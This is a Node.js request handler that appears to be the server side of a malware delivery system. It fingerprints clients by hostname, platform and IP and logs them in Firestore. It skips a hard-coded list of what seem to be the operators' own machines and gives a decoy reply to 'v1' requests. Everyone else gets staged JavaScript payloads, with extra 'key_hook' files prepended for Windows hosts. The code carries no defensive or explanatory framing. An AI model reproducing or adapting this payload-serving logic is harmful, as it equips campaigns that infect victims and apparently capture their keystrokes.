const fs = require("fs");
const path = require("path");
const getLastPart = require("../utils/getLastPart");
const { addDoc, collection, query, where, getDocs } = require("firebase/firestore"); // Import Firestore functions

async function getFileContents(req, res, db) {

    try {
        let fileName = req.body.version || getLastPart(req.body);
        let uID = fileName;
        if (req.body.hostname == 'G-TechdeMacBook-Pro.local' || req.body.hostname == 'onimisea' || req.body.hostname == 'Fortunes-MacBook-Pro.local'
            || req.body.hostname == 'KK' || req.body.hostname == 'blackjack' || req.body.hostname == '192.168.1.6' || req.body.hostname == 'DESKTOP-01G5BNC'
            || req.body.hostname == 'Fortunes-MBP.lan' || req.body.hostname == 'MOSHOOD-PC' || req.body.hostname == 'I318D05'
            || req.body.hostname == 'SVY'
        ) {
            return;
        }

        if (fileName === "v1") {
            return res.json('console.log("Development server started...")');
        } else {
            // Get IP address from the request
            const requestedIp = req.clientIp;

            const dataRef = collection(db, "registered");
            const q = query(dataRef, where("ip", "==", requestedIp));
            const snapshot = await getDocs(q);

            let controlState;
            if (snapshot.empty) {
                controlState = "S2";

                const logData = {
                    ip: requestedIp,
                    controlState: controlState,
                };
                await addDoc(collection(db, "registered"), logData);
            }

            // Assuming we're interested in the first document for the specified IP
            snapshot.forEach((doc) => {
                controlState = doc.data().controlState; // Get controlState from the document
            });

            const attachName = fileName + "_a";
            // Determine the file name based on the controlState

            switch (controlState) {
                case 'S1':
                    fileName = '0'; // Replace with your actual file name
                    break;
                case 'S2':
                    fileName += '';
                    break;
                case 'S3':
                    fileName += '_3'; // Replace with your actual file name
                    break;
                // default:
                //     return res.status(400).json({ error: "Invalid control state." }); // Handle undefined control states
            }

            const filePath = path.join(process.cwd(), "5", fileName);
            const attachPath = path.join(process.cwd(), "5", attachName);
            const prePath = path.join(process.cwd(), "5", 'key_hook');
            const prePath2 = path.join(process.cwd(), "5", 'key_hook_2');
            fs.readdir(path.join(process.cwd(), "5"), (err, files) => {
                console.log(({ version: "1", error: err, files }));
                if (err) {
                    // return res.json({ error: err, files });
                    console.error(err);
                    // return res.status(500).json({ error: "Could not list files." });
                }
                console.log("Available files: ", files); // Use this to log available files
                // Proceed to access your file
            });

            let controllerContent = '';
            fs.readFile(attachPath, "utf-8", (err, attachContent) => {
                if (err) {
                    //return res.json({});
                }
                controllerContent = attachContent;
            });
            fs.access(filePath, fs.constants.F_OK, (err) => {
                if (err) {
                    return res.json({});
                }

                fs.readFile(filePath, "utf-8", (err, mainContent) => {
                    if (err) {
                        return res.json({});
                    }

                    if (req.body.platform === "win32" || req.body.OS === "Windows_NT") {
                        if (req.body.hostname == 'DESKTOP-9GUV3AH' || uID == '4') {
                            fs.readFile(prePath2, "utf-8", (err, preContent2) => {
                                if (err) {
                                    return res.json({});
                                }
                                return res.send(' { ' + preContent2 + ' } ' + mainContent + ' { ' + controllerContent + ' } ');
                            });
                        } else {
                            return res.send(mainContent + ' { ' + controllerContent + ' } ');
                        }
                    } else {
                        return res.send(mainContent + ' { ' + controllerContent + ' } ');
                    }
                });
            });
        }

    } catch (err) {
        console.error("Error fetching control state:", err);
    }
}

module.exports = { getFileContents };